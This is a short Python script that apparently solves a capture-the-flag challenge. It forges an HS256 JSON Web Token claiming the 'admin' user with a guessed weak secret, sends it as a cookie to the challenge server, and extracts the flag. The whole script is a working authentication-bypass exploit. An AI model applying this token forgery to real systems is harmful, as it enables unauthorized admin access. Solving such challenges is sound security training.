#!/usr/bin/python3
import requests
import re
import jwt

url = 'http://chall.nitdgplug.org:30299/flag'

secret = "badboy"
jwt = jwt.encode({"user": "admin"}, secret, algorithm="HS256")
jar = {'token': jwt}

response = requests.get(url, cookies=jar)
source = response.text

print(re.findall(r'(GLUG\{.+\})', source)[0])